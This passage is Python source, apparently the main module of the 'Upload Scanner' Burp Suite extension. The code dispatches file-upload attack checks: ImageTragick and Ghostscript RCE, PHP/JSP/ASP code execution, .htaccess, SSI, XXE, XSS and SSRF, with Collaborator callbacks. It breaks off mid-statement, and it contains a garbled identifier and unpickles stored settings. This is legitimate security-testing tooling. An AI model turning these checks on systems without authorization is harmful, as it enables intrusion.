# Burp imports
from burp import IBurpExtender
from burp import IScannerInsertionPoint
from burp import IScannerCheck
from burp import IHttpListener
from burp import ITab
from burp import IContextMenuFactory
from burp import IExtensionStateListener
from burp import IScannerInsertionPointProvider

# Relative imports (avoid circular import)
from debuging.debug import DEBUG_MODE
from fingerpings.AviM3uXbin import AviM3uXbin
from fingerpings.Fingerping import Fingerping
from fingerpings.FingerpingImages import FingerpingImages
from helpers.ImageHelpers import ImageHelpers
from helpers.FloydsHelpers import FloydsHelpers
from injectors.FlexiInjector import FlexiInjector
from injectors.MultipartInjector import MultipartInjector
from insertionPoints.InsertionPointProviderForActiveScan import InsertionPointProviderForActiveScan
from misc.CustomScanIssue import CustomScanIssue
from misc.BackdooredFile import BackdooredFile
from misc.Constants import Constants
from misc.CustomHttpService import CustomHttpService
from misc.CustomRequestResponse import CustomRequestResponse
from misc.ScanController import ScanController
from misc.Sender import Sender
from ui.OptionsPanel import OptionsPanel
from ui.LogEntry import LogEntry
from ui.Table import Table
from misc.Misc import CloseableTab
from misc.Misc import ColabTest
from misc.BurpCollaborator import CollaboratorMonitorThread
from misc.Downloader import DownloadMatcher
from misc.Downloader import DownloadMatcherCollection
from misc.Misc import MenuItemAction
from misc.Misc import Readme
from misc.Misc import SsiPayloadGenerator
from misc.Misc import StopScanException
from misc.Misc import UploadRequestsResponses
from misc.Misc import Xbm
from misc.Misc import Xxe
from misc.Misc import XxeOfficeDoc
from misc.Misc import XxeXmp
from misc.BurpCollaborator import BurpCollaborator
from checks.php_rce import php_rce_check

# Java stdlib imports
from java.util import ArrayList
from javax.swing import JLabel
from javax.swing import JScrollPane
from javax.swing import JSplitPane
from javax.swing import JTabbedPane
from javax.swing import JOptionPane
from javax.swing import JMenuItem
from javax.swing import SwingConstants
from javax.swing import JTabbedPane, JScrollPane, JLabel, JSplitPane, JMenuItem, JOptionPane
from javax.swing.table import AbstractTableModel
from javax.swing.table import AbstractTableModel
from java.awt import Desktop
from java.net import URI
from java.awt import Desktop

# python stdlib imports
import random  # to chose randomly
import string  # ascii letters to chose random file name from
import urllib  # URL encode etc.
import time  # detect timeouts and sleep for Threads
import os  # local paths parsing etc.
import copy  # copying str/lists if a duplicate is necessary
import struct  # Little/Big endian attack strings
import cgi  # for HTML escaping
import urlparse  # urlparser for custom HTTP services
import sys  # to show detailed exception traces
import traceback  # to show detailed exception traces
import textwrap  # to wrap request texts after a certain amount of chars
import threading  # to make stuff thread safe
import pickle  # persisting object serialization between extension reloads
import cgi
from copy import copy


if DEBUG_MODE:
    # Hint: Module "gc" garbage collector is not fully implemented in Jython as it uses the Java garbage collector
    # see https://answers.launchpad.net/sikuli/+question/160893
    import profile  # For profiling to fix performance problems
    import pdb  # For debugging
    # Use this to do debugging on command line:
    # if DEBUG_MODE:
    #     pdb.set_trace()

# Glossary to read this code
# brr: abbrevation for BaseRequestRespnse, it's of class IHttpRequestResponse
# urr: abbrevation UploadRequestsResponses, see class UploadRequestsResponses,
#      has three members of type IHttpRequestResponse (upload, preflight, redownload)
# *_types: specifies filename prefix, suffic (extension) and content_type for a test
#      these are cut down in the function get_types, eg. when we detect that the content
#      type is not sent at all in the request


class BurpExtender(IBurpExtender, IScannerCheck,
                   AbstractTableModel, ITab, IScannerInsertionPointProvider,
                   IHttpListener, IContextMenuFactory, IExtensionStateListener):

    # Implement IBurpExtender
    def registerExtenderCallbacks(self, callbacks):
        print("Extension loaded")

        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        if DEBUG_MODE:
            sys.stdout = callbacks.getStdout()
            sys.stderr = callbacks.getStderr()

        callbacks.setExtensionName("Upload Scanner")

        # only set here at the beginning once, then constant
        Constants.FILE_START = ''.join(random.sample(string.ascii_letters, 4))

        # Internal vars/read-write:
        self._log = ArrayList()
        # The functions of DownloadMatcherCollection are thread safe
        self.dl_matchers = DownloadMatcherCollection(self._helpers)

        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        # Find out if CollaboratorMonitorThread is already running.
        # Although this works and we can find our not-killed Thread, it will not have the
        # functions of CollaboratorMonitorThread, so for example the "add" function
        # isn't there anymore.
        # for thread in Thread.getAllStackTraces().keySet():
        #     print(thread.getName())
        #     if thread.name == CollaboratorMonitorThread.NAME:
        #         print("Found running CollaboratorMonitorThread, reusing")
        #         self.collab_monitor_thread = thread
        #         self.collab_monitor_thread.resume(self)
        #         break
        # else:
        #     # No break occured on the for loop
        #     # Create a new thread
        #     print("No CollaboratorMonitorThread found, starting a new one")
        #     self.collab_monitor_thread = CollaboratorMonitorThread(self)
        #     self.collab_monitor_thread.start()

        # A lock to make things thread safe that access extension level globals
        # Attention: use wisely! On MacOS it seems to be fine that a thread has the lock
        # and acquires it again, that's fine. However, on Windows acquiring the same lock
        # in the same thread twice will result in a thread lock and everything will halt!
        self.globals_write_lock = threading.Lock()

        self.collab_monitor_thread = CollaboratorMonitorThread(self)
        self.collab_monitor_thread.start()

        self._warned_flexiinjector = False
        self._no_of_errors = 0
        self._ui_tab_index = 1
        self._option_panels = {}

        print("Creating UI...")
        self._create_ui()

        with self.globals_write_lock:
            print("Deserializing settings...")
            self.deserialize_settings()


        # It is important these registrations are done at the end, so the global_lock is freed.
        # Otherwise when still deserializing and using the context menu at the same time there
        # has been a global Burp thread-lock where I had to force quit Burp :(

        # Automatic active scanning of multipart forms
        callbacks.registerScannerCheck(self)
        # Automatic active scanning of non-multipart messages (method called once per actively scanned request)
        callbacks.registerScannerInsertionPointProvider(self)
        # Automatic issue detection when file is downloaded
        callbacks.registerHttpListener(self)
        # Context menu to send requests to this extension
        callbacks.registerContextMenuFactory(self)
        # Get notified when extension is unloaded
        callbacks.registerExtensionStateListener(self)

        self.sender = Sender(self._callbacks, self)

        print("Extension fully registered and ready")

    def _create_ui(self):

        self._main_jtabedpane = JTabbedPane()

        # The split pane with the log and request/response details
        self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)

        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)
        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        self._requestViewer = self._callbacks.createMessageEditor(logTable, False)
        self._responseViewer = self._callbacks.createMessageEditor(logTable, False)
        tabs.addTab("Request", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        self._splitpane.setRightComponent(tabs)

        # OPTIONS
        self._globalOptionsPanel = OptionsPanel(self, self._callbacks, self._helpers, global_options=True)

        # README
        self._aboutJLabel = JLabel(Readme.get_readme(), SwingConstants.CENTER)
        self._aboutJLabel.putClientProperty("html.disable", None)
        
        self._callbacks.customizeUiComponent(self._main_jtabedpane)
        self._callbacks.customizeUiComponent(self._splitpane)
        self._callbacks.customizeUiComponent(self._globalOptionsPanel)
        self._callbacks.customizeUiComponent(self._aboutJLabel)

        self._main_jtabedpane.addTab("Global & Active Scanning configuration", None, JScrollPane(self._globalOptionsPanel), None)
        self._main_jtabedpane.addTab("Done uploads", None, self._splitpane, None)
        self._main_jtabedpane.addTab("About", None, JScrollPane(self._aboutJLabel), None)

        self._callbacks.addSuiteTab(self)

        # UI END

    # Implement IExtensionStateListener
    def extensionUnloaded(self):
        self.collab_monitor_thread.extensionUnloaded()
        for index in self._option_panels:
            self._option_panels[index].stop_scan(None)
        self.serialize_settings()
        print("Extension unloaded")

    def serialize_settings(self):
        self.save_project_setting("UploadScanner_dl_matchers", "")
        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        #self.save_project_setting("UploadScanner_collab_monitor", None)
        self.save_project_setting("UploadScanner_tabs", "")
        self._callbacks.saveExtensionSetting('UploadScanner_global_opts', "")
        if not self._globalOptionsPanel.cb_delete_settings.isSelected():
            self._callbacks.saveExtensionSetting('UploadScanner_global_opts', pickle.dumps(self._globalOptionsPanel.serialize()).encode("base64"))
            self.save_project_setting('UploadScanner_dl_matchers',
                                                 pickle.dumps(self.dl_matchers.serialize()).encode("base64"))
            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            # what a pity, IBurpCollaboratorClientContext objects can also not be serialized... :(
            #self.save_project_setting('UploadScanner_collab_monitor',
            #                                     pickle.dumps(self.collab_monitor.serialize()).encode("base64"))
            self.save_project_setting('UploadScanner_tabs',
                                                 pickle.dumps([self._option_panels[x].serialize() for x in self._option_panels]).encode("base64"))

            print("Saved settings...")
        else:
            print("Deleted all settings...")

    def deserialize_settings(self):
        try:
            k = self.load_project_setting("UploadScanner_dl_matchers")
            if k:
                dm = pickle.loads(k.decode("base64"))
                if dm:
                    self.dl_matchers.deserialize(dm)

            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            #k = self.load_project_setting("UploadScanner_collab_monitor")
            #if k:
            #    cm = pickle.loads(k.decode("base64"))
            #    self.collab_monitor.deserialize(cm)

            k = self.load_project_setting("UploadScanner_tabs")
            if k:
                tabs = pickle.loads(k.decode("base64"))
                if tabs:
                    for option_panel in tabs:
                        # right part, create with dummy request first first
                        sc = ScanController(CustomRequestResponse('', '', CustomHttpService('https://example.org'), '', ''), self._callbacks)
                        # left part, options
                        # add a reference to the ScanController to the options
                        options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                        # Take all settings from the serialized object (also recursively changes ScanController)
                        options.deserialize(option_panel)
                        self.create_tab(options, sc)

            k = self._callbacks.loadExtensionSetting("UploadScanner_global_opts")
            if k:
                cm = pickle.loads(k.decode("base64"))
                if cm:
                    self._globalOptionsPanel.deserialize(cm)
            print("Restored settings...")
        except:
            e = traceback.format_exc()
            print("An error occured when deserializing settings. We just ignore the serialized data therefore.")
            print(e)

        try:
            self.save_project_setting("UploadScanner_dl_matchers", "")
            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            #self.save_project_setting("UploadScanner_collab_monitor", None)
            self.save_project_setting("UploadScanner_tabs", "")
        except:
            e = traceback.format_exc()
            print("An error occured when storing empty serialize data We just ignore it for now.")
            print(e)

    def save_project_setting(self, name, value):
        request = "GET /"+name+" HTTP/1.0\r\n\r\n" \
                  "You can ignore this item in the site map. It was created by the UploadScanner extension. The \n" \
                  "reason is that the Burp API is missing a certain functionality to save settings. \n" \
                  "TODO Burp API limitation: This is a hackish way to be able to store project-scope settings.\n" \
                  "We don't want to restore requests/responses of tabs in a totally different Burp project.\n" \
                  "However, unfortunately there is no saveExtensionProjectSetting in the Burp API :(\n" \
                  "So we have to abuse the addToSiteMap API to store project-specific things\n" \
                  "Even when using this hack we currently cannot persist Collaborator interaction checks\n" \
                  "(IBurpCollaboratorClientContext is not serializable and Threads loose their Python class\n" \
                  "functionality when unloaded) due to Burp API limitations."
        response = None
        if value:
            response = "HTTP/1.1 200 OK\r\n" + value
        rr = CustomRequestResponse(name, '', CustomHttpService('http://uploadscannerextension.local/'), request, response)
        self._callbacks.addToSiteMap(rr)


    def load_project_setting(self, name):
        rrs = self._callbacks.getSiteMap('http://uploadscannerextension.local/'+name)
        if rrs:
            rr = rrs[0]
            if rr.getResponse():
                return "\r\n".join(FloydsHelpers.jb2ps(rr.getResponse()).split("\r\n")[1:])
            else:
                return None
        else:
            return None


    # Implement IContextMenuFactory
    def createMenuItems(self, invocation): #IContextMenuInvocation
        action = MenuItemAction(invocation, self)
        menu_item = JMenuItem(action)
        menu_item.setText("Send to Upload Scanner")
        return [menu_item, ]

    # interaction from context menu
    def new_request_response(self, invocation):
        brr = invocation.getSelectedMessages()[0]

        # We can only work with requests that also have a response:
        if not brr.getRequest() or not brr.getResponse():
            print("Tried to send a request where no response came back via context menu to the UploadScanner. Ignoring.")
        else:
            with self.globals_write_lock:
                # right part
                sc = ScanController(brr, self._callbacks)
                # left part, options
                # add a reference to the ScanController to the options
                options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                # Take all settings from global options:
                options.deserialize(self._globalOptionsPanel.serialize(), global_to_tab=True)
                self.create_tab(options, sc)

    def create_tab(self, options, sc):
        # main split view
        splitpane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
        splitpane.setLeftComponent(JScrollPane(options))
        splitpane.setRightComponent(JScrollPane(sc))

        # The CloseableTab will add itself to its parent
        CloseableTab(str(self._ui_tab_index), self._main_jtabedpane, splitpane,
                         self._callbacks.customizeUiComponent, self.tab_closed, self._ui_tab_index)
        self._option_panels[self._ui_tab_index] = options
        self._ui_tab_index += 1

    def tab_closed(self, index):
        # What happens when a tab closes? Things we could take care of:
        # DownloadMatchers created in this tab (remove them?) -> No, we want to persist them
        # ColabMonitor urls added (remove them?) -> No, keep them
        # For now we just don't do anything, meaning memory consumption never decreases...
        # The only thing we do is remove them from _option_panels so they don't show again when
        # serialized and deserialized, however, their DownloadMatchers will survive
        should_close = False
        if self._option_panels[index].scan_controler.scan_running:
            should_close = self.show_tab_close_popup()
        else:
            should_close = True
        if should_close:
            with self.globals_write_lock:
                print("Closing tab", index)
                del self._option_panels[index]
        return should_close

    # Implement ITab
    def getTabCaption(self):
        return "Upload Scanner"

    def getUiComponent(self):
        return self._main_jtabedpane

    def show_error_popup(self, error_details, location, brr):
        if "OutOfMemoryError: java.lang.OutOfMemoryError" in error_details:
            full_msg = "Your Burp ran out of memory (RAM). This is a fatal issue and was detected by the UploadScanner " \
                       "extension. As there is no way to recover from this, UploadScanner is now going to unload " \
                       "itself, hopefully freeing up some memory for you. Please restart Burp with more memory " \
                       "allocated as described under '9. Burp runs out of memory.' on " \
                       "https://support.portswigger.net/customer/portal/articles/1965913-troubleshooting . Basically " \
                       "you have to start Burp with a larger -Xmx argument. Other strategies might be starting a new " \
                       "Burp project, loading less extensions or processing less requests in general. Press 'OK' to " \
                       "unload the UploadScanner extension."
            response = JOptshow_error_popuionPane.showConfirmDialog(self._globalOptionsPanel, full_msg, "Out of memory",
                                                     JOptionPane.OK_CANCEL_OPTION)
            if response == JOptionPane.OK_OPTION:
                self._callbacks.unloadExtension()
            return
        try:
            f = file("BappManifest.bmf", "rb").readlines()
            for line in f:
                if line.startswith("ScreenVersion: "):
                    error_details += "\n" + line.replace("ScreenVersion", "Upload Scanner Version")
                    break
            error_details += "\nExtension code location: " + location
        except:
            print("Could not find plugin version...")
        try:
            error_details += "\nJython version: " + sys.version
            error_details += "\nJava version: " + os.system.getProperty("java.version")
        except:
            print("Could not find Jython/Java version...")
        try:
            error_details += "\nBurp version: " + " ".join([x for x in self._callbacks.getBurpVersion()])
            error_details += "\nCommand line arguments: " + " ".join([x for x in self._callbacks.getCommandLineArguments()])
            error_details += "\nWas loaded from BApp: " + str(self._callbacks.isExtensionBapp())
        except:
            print("Could not find Burp details...")
        self._no_of_errors += 1
        if self._no_of_errors < 2:
            full_msg = 'The Burp extension "Upload Scanner" just crashed. The details of the issue are at the bottom. \n' \
                       'Please let the maintainer of the extension know. No automatic reporting is present, but if you could \n' \
                       'report the issue on github http://github.com/floyd-fuh/burp-UploadScanner \n' \
                       'or send an Email to burpplugins' + 'QGZsb3lkLmNo'.decode("base64") + ' this would \n' \
                       'be appreciated. The details of the error below can also be found in the "Extender" tab.\n' \
                       'Do you want to open a github issue with the details below now? \n' \
                       'Details: \n{}\n'.format(FloydsHelpers.u2s(error_details))
            response = JOptionPane.showConfirmDialog(self._globalOptionsPanel, full_msg, full_msg,
                                                     JOptionPane.YES_NO_OPTION)
            if response == JOptionPane.YES_OPTION:
                # Ask if it would also be OK to send the request
                request_msg = "Is it OK to send along the following request? If you click 'No' this request will not \n" \
                              "be sent, but please consider submitting an anonymized/redacted version of the request \n" \
                              "along with the bug report, as otherwise a root cause analysis is likely not possible. \n" \
                              "You can also find this request in the Extender tab in the UploadScanner Output tab. \n\n"
                request_content = textwrap.fill(repr(FloydsHelpers.jb2ps(brr.getRequest())), 100)
                print(request_content)

                if len(request_content) > 1000:
                    request_content = request_content[:1000] + "..."
                request_msg += request_content
                response = JOptionPane.showConfirmDialog(self._globalOptionsPanel, request_msg, request_msg,
                                                         JOptionPane.YES_NO_OPTION)
                if response == JOptionPane.YES_OPTION:
                    error_details += "\nRequest: " + request_content
                else:
                    error_details += "\nRequest: None"

                if Desktop.isDesktopSupported():
                    desktop = Desktop.getDesktop()
                    if desktop.isSupported(Desktop.Action.BROWSE):
                        github = "https://github.com/modzero/mod0BurpUploadScanner/issues/new?title=Bug" \
                                 "&body=" + urllib.quote("```\n" + error_details + "\n```")
                        desktop.browse(URI(github))
                    #if desktop.isSupported(Desktop.Action.MAIL):
                    #    mailto = "mailto:burpplugins" + 'QGZsb3lkLmNo'.decode("base64") + "?subject=UploadScanner%20bug"
                    #    mailto += "&body=" + urllib.quote(error_details)
                    #    desktop.mail(URI(mailto))

    def show_tab_close_popup(self):
        full_msg = 'Scan still running. Burp Collaborator interactions might get lost. Are you sure you want to close the tab? \n'
        response = JOptionPane.showConfirmDialog(self._globalOptionsPanel, full_msg, full_msg, JOptionPane.YES_NO_OPTION)
        if response == JOptionPane.YES_OPTION:
            return True
        else:
            return False

    # Implement AbstractTableModel
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 2

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "Status"
        if columnIndex == 1:
            return "URL"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return logEntry._status
        if columnIndex == 1:
            return logEntry._url
        return ""

    # Helper function to easily add an entry to the log:
    def add_log_entry(self, rr):
        with self.globals_write_lock:
            row = self._log.size()
            status = self._helpers.analyzeResponse(rr.getResponse()).getStatusCode()
            self._log.add(LogEntry(status, self._callbacks.saveBuffersToTempFiles(rr),
                               self._helpers.analyzeRequest(rr).getUrl()))
            self.fireTableRowsInserted(row, row)

    # Implement IHttpListener
    def processHttpMessage(self, _, messageIsRequest, base_request_response):
        try:
            # This can get computationally expensive if there are a lot of files that were uploaded...
            # ... make sure we only scan responses and if we have any matcher rules
            if not messageIsRequest:
                resp = base_request_response.getResponse()
                if not resp:
                    print("processHttpMessage called with BaseRequestResponse with no response. Ignoring.")
                    return
                if len(resp) >= Constants.MAX_RESPONSE_SIZE:
                    # Don't look at responses longer than MAX_RESPONSE_SIZE
                    return
                req = base_request_response.getRequest()
                if not req:
                    print("processHttpMessage called with BaseRequestResponse with no request. Ignoring.")
                    return
                iRequestInfo = self._helpers.analyzeRequest(base_request_response)
                #print(type(iRequestInfo.getUrl().toString()), repr(iRequestInfo.getUrl().toString()))
                url = iRequestInfo.getUrl()
                if url:
                    url = FloydsHelpers.u2s(url.toString())
                else:
                    # Indeed the url might be None... according to https://github.com/modzero/mod0BurpUploadScanner/issues/17
                    return
                # ... do not scan things that are not "in scope" (see DownloadMatcherCollection class)
                # means we only check if we uploaded stuff to that host or the user configured
                # another host in the ReDownloader options that is therefore also "in scope"
                matchers = self.dl_matchers.get_matchers_for_url(url)
                if not matchers:
                    #We hit this for all not "in scope" requests
                    #we also hit it for URLs that can not be parsed by urlparse such as https://github.com/modzero/mod0BurpUploadScanner/issues/12
                    return
                iResponseInfo = self._helpers.analyzeResponse(base_request_response.getResponse())
                headers = [FloydsHelpers.u2s(x) for x in iResponseInfo.getHeaders()]
                body = FloydsHelpers.jb2ps(base_request_response.getResponse())[iResponseInfo.getBodyOffset():]
                # We do a small hack here: we iterate in reverse order (denoted with [::-1]) over the passive checks. We do that as
                # the thumbnail check that is done for image metadata is a little tricky: as the thumbnail image itself
                # is used as a regular test and another image file includes the contents of the thumbnail image as well, the wrong issue
                # would be shown. In other words: the entire thumbnail file is included in one of the image files. When we iterate
                # reversed, we hit the correct issue definition first.
                for matcher in list(matchers)[::-1]:
                    if matcher.matches(url, headers, body):
                        issue_copy = matcher.issue.create_copy()
                        if Constants.MARKER_URL_CONTENT in issue_copy.detail:
                            if matcher.url_content:
                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                          matcher.url_content)
                            elif matcher.filename_content_disposition:
                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                              matcher.filename_content_disposition)
                            elif matcher.filecontent:
                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                              matcher.filecontent)
                            else:
                                issue_copy.detail = issue_copy.detail.replace(Constants.MARKER_URL_CONTENT,
                                                                              "UNKNOWN")
                        if matcher.check_xss:
                            content_disposition = False
                            for header in headers:
                                if header.lower().startswith("content-disposition: attachment"):
                                    # This is a special case for "Content-Disposition: attachment" handling
                                    desc = "<br><br>This response includes the 'Content-Disposition: attachment' header. " \
                                           "This means the file is not shown inline, but downloaded in browsers. " \
                                           "So this might be unexploitable. However, as there were so many bypasses " \
                                           "for this in the past, this is still flagged as an issue. Certain old " \
                                           "browsers could still be convinced into inlining the file and therefore " \
                                           "execute the XSS payload. Moreover, browser plugins (flash/pdf/Java) might " \
                                           "also not honor the Content-Disposition header. There have also been browser " \
                                           "bugs that allowed executing the XSS. Moreover, an HTTP header injection can " \
                                           "be used to still execute the XSS. See " \
                                           "https://markitzeroday.com/xss/bypass/2018/04/17/defeating-content-disposition.html" \
                                           " for further information."
                                    issue_copy.detail += desc
                                    issue_copy.severityPy = "Tentative"
                                    break
                        self._create_download_scan_issue(base_request_response, issue_copy)

                        # As the matcher was now triggered, we can remove it as it should not trigger again,
                        # because every attack defines its own matcher
                        self.dl_matchers.remove_reported(url, matcher)

                        # At maximum there will be 1 scan issue per message, as it is unlikely that there is more than 1
                        # download in a HTTP message. Therefore we can use "return" after adding a scan issue.
                        return
        except:
            # I had enough of being the exception collector of processHttpMessage and python lib quirks...
            # no alerting of the user in this case anymore
            #self.show_error_popup(traceback.format_exc(), "processHttpMessage", base_request_response)
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    def _create_download_scan_issue(self, base_request_response, issue):
        # For unknown reasons (probably Jython Vodoo) this doesn't work:
        # issue.servicePy = base_request_response.getHttpService()
        # issue.urlPy = self._helpers.analyzeRequest(base_request_response).getUrl()
        # Therefore we do this:
        issue.setHttpService(base_request_response.getHttpService())
        issue.setUrl(self._helpers.analyzeRequest(base_request_response).getUrl())

        issue.httpMessagesPy.append(base_request_response)
        self._add_scan_issue(issue)

    def _add_scan_issue(self, issue):
        print("Reporting", issue.name)
        #print(issue.toString())
        self._callbacks.addScanIssue(issue)

    # implement IScannerCheck
    def doPassiveScan(self, base_request_response):
        # see processHttpMessage which is a more general case of passive scan
        pass

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        #if existingIssue.getUrl() == newIssue.getUrl() and \
        #                existingIssue.getIssueName() == newIssue.getIssueName():
        #    return -1
        #else:
        return 0

    def doActiveScan(self, base_request_response, insertionPoint, options=None):
        try:
            # Also see getInsertionPoints
            if insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_PARAM_MULTIPART_ATTR:
                if insertionPoint.getInsertionPointName() == "filename":
                    req = base_request_response.getRequest()
                    if not req:
                        print("doActiveScan called with BaseRequestResponse with no request. Ignoring.")
                        return
                    print("Multipart filename found!")
                    if not options:
                        options = self._globalOptionsPanel
                    injector = MultipartInjector(base_request_response, options, insertionPoint, self._helpers, Constants.NEWLINE)
                    self.do_checks(injector)
                else:
                    print("This is not a type file but something else in a multipart message:", insertionPoint.getInsertionPointName())
        except:
            self.show_error_popup(traceback.format_exc(), "doActiveScan", base_request_response)
            if options and options.redl_enabled:
                options.scan_was_stopped()
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    # Implement IScannerInsertionPointProvider
    def getInsertionPoints(self, base_request_response):
        try:
            # TODO Burp API limitation: Is there another way to simply say "each active scanned HTTP request once"?
            # it seems not: https://support.portswigger.net/customer/en/portal/questions/16776337-confusion-on-insertionpoints-active-scan-module?new=16776337
            # So we are going to abuse a functionality of Burp called IScannerInsertionPoint
            # which is by coincidence always called once per request for every actively scanned item (with base_request_response)
            # this is an ugly hack...
            req = base_request_response.getRequest()
            if not req:
                # print("getInsertionPoints was called with a BaseRequestResponse where the Request was None/null...")
                return
            if "content-type: multipart/form-data" in FloydsHelpers.jb2ps(req).lower():
                print("It seems to be a mutlipart/form-data we don't need to check with the FlexiInjector")
            else:
                self.run_flexiinjector(base_request_response)
            # Now after the above hack, do what this function actually does, return insertion points
            if self._globalOptionsPanel.modules['activescan'].isSelected():
                return InsertionPointProviderForActiveScan(self, self._globalOptionsPanel, self._helpers).getInsertionPoints(base_request_response)
            else:
                return []
        except:
            self.show_error_popup(traceback.format_exc(), "Constants.getInsertionPoints", base_request_response)
            raise sys.exc_info()[1], None, sys.exc_info()[2]

    def run_flexiinjector(self, base_request_response, options=None):
        fi = None
        if not options:
            options = self._globalOptionsPanel
        try:
            if options.fi_ofilename:
                fi = FlexiInjector(base_request_response, options, self._helpers, Constants.NEWLINE)
                # We test only those requests where we find at least the content in the request as some implementations
                # might not send the filename to the server
                if fi.get_uploaded_content():
                    print("FlexiInjector insertion point found!")
                    self.do_checks(fi)
                    return True
            elif not self._warned_flexiinjector:
                print("You did not specify the file you are going to upload, no FlexiInjector checks will be done")
                self._warned_flexiinjector = True
        except:
            self.show_error_popup(traceback.format_exc(), "run_flexiinjector", base_request_response)
            if fi and fi.opts.redl_enabled:
                fi.opts.scan_was_stopped()
            raise sys.exc_info()[1], None, sys.exc_info()[2]
        return False

    # The actual implementation of the scan logic from here
    def do_checks(self, injector):
        burp_colab = BurpCollaborator(self._callbacks)
        if not burp_colab.is_available:
            burp_colab = None
            print("Warning: No Burp Collaborator will be used")
        colab_tests = []

        # We need to make sure that the global download matchers are from now on active for the URL we scan
        url = FloydsHelpers.u2s(self._helpers.analyzeRequest(injector.get_brr()).getUrl().toString())
        self.dl_matchers.add_collection(url)

        scan_was_stopped = False

        try:
            # Sanity/debug check. Simply uploads a white picture called screenshot_white.png
            print("Doing sanity check and uploading a white png file called screenshot_white.png")
            self._sanity_check(injector)
            # Make sure we don't active scan again a request we are active scanning right now
            # Do this by checking for redl_enabled
            if injector.opts.modules['activescan'].isSelected() and injector.opts.redl_enabled:
                brr = injector.get_brr()
                service = brr.getHttpService()
                self._callbacks.doActiveScan(service.getHost(), service.getPort(), 'https' in service.getProtocol(), brr.getRequest())
            # Imagetragick - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['imagetragick'].isSelected():
                print("\nDoing ImageTragick checks")
                colab_tests.extend(self._imagetragick_cve_2016_3718(injector, burp_colab))
                colab_tests.extend(self._imagetragick_cve_2016_3714_rce(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                self._imagetragick_cve_2016_3714_sleep(injector)
                self._bad_manners_cve_2018_16323(injector)
            # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
            if injector.opts.modules['magick'].isSelected():
                print("\nDoing Image-/GraphicsMagick checks")
                colab_tests.extend(self._magick(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Ghostscript - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['gs'].isSelected():
                print("\nDoing Ghostscript checks")
                colab_tests.extend(self._ghostscript(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # LibAVFormat - generic, as the file format will always support external URLs
            if injector.opts.modules['libavformat'].isSelected():
                print("\nDoing LibAVFormat checks")
                colab_tests.extend(self._libavformat(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # PHP RCEs - generic, as there will always be someone who screws up PHP:
            if injector.opts.modules['php'].isSelected():
                print("\nDoing PHP code checks")
                php_rce_check(injector, self._globalOptionsPanel, self._callbacks, self.dl_matchers, self)
            # JSP RCEs - generic, as there will always be someone who screws up JSP:
            if injector.opts.modules['jsp'].isSelected():
                print("\nDoing JSP code checks")
                self._jsp_rce(injector)
            # ASP RCEs - generic, as there will always be someone who screws up ASP:
            if injector.opts.modules['asp'].isSelected():
                print("\nDoing ASP code checks")
                self._asp_rce(injector)
            # htaccess - generic
            # we do the htaccess upload early, because if it enables "Options +Includes ..." by uploading a .htaccess
            # then we can successfully do Server Side Includes, CGI execution, etc. in a later module...
            if injector.opts.modules['htaccess'].isSelected():
                print("\nDoing htaccess/web.config checks")
                colab_tests.extend(self._htaccess(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CGIs - generic
            if injector.opts.modules['cgi'].isSelected():
                print("\nDoing CGIs checks")
                colab_tests.extend(self._cgi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # SSI - generic
            if injector.opts.modules['ssi'].isSelected():
                print("\nDoing SSI/ESI checks")
                colab_tests.extend(self._ssi(injector, burp_colab))
                colab_tests.extend(self._esi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # XXE - generic
            if injector.opts.modules['xxe'].isSelected():
                print("\nDoing XXE checks")
                colab_tests.extend(self._xxe_svg_external_image(injector, burp_colab))
                colab_tests.extend(self._xxe_svg_external_java_archive(injector, burp_colab))
                colab_tests.extend(self._xxe_xml(injector, burp_colab))
                colab_tests.extend(self._xxe_office(injector, burp_colab))
                colab_tests.extend(self._xxe_xmp(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # XSS - generic
            if injector.opts.modules['xss'].isSelected():
                print("\nDoing XSS checks")
                self._xss_html(injector)
                self._xss_svg(injector)
                self._xss_swf(injector)
                self._xss_backdoored_file(injector)
            # eicar - generic
            if injector.opts.modules['eicar'].isSelected():
                print("\nDoing eicar checks")
                self._eicar(injector)
            # pdf - generic
            if injector.opts.modules['pdf'].isSelected():
                print("\nDoing pdf checks")
                colab_tests.extend(self._pdf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # other ssrf - generic
            if injector.opts.modules['ssrf'].isSelected():
